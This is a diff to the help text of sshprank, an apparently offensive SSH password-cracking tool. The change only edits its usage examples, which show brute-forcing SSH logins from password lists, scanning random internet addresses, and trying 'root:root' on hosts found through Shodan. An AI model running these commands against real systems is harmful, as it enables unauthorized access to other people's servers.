@@ -124,22 +124,22 @@ HELP = BOLD + '''usage''' + NORM + '''
 ''' + BOLD + '''examples''' + NORM + '''
 
   # crack targets from a given list with user admin, pw-list and 20 host-threads
-  $ ./sshprank -l sshds.txt -u admin -P /tmp/passlist.txt -x 20
+  $ sshprank -l sshds.txt -u admin -P /tmp/passlist.txt -x 20
 
   # first scan then crack from founds ssh services
-  $ sudo ./sshprank -m '-p22,2022 --rate 5000 --source-ip 192.168.13.37 \\
+  $ sudo sshprank -m '-p22,2022 --rate 5000 --source-ip 192.168.13.37 \\
     --range 192.168.13.1/24'
 
   # generate 1k random ipv4 addresses, then port-scan (tcp/22 here) with 1k p/s
   # and crack login 'root:root' on found sshds
-  $ sudo ./sshprank -m '-p22 --rate=1000' -r 1000 -v
+  $ sudo sshprank -m '-p22 --rate=1000' -r 1000 -v
 
   # search 50 ssh servers via shodan and crack logins using 'root:root' against
   # found sshds
-  $ sudo ./sshprank -s 'SSH:1:50'
+  $ sshprank -s 'SSH:1:50'
 
   # grab banners and output to file with format supported for '-l' option
-  $ ./sshprank -b hosts.txt > sshds2.txt
+  $ sshprank -b hosts.txt > sshds2.txt
 '''
 
 opts = {
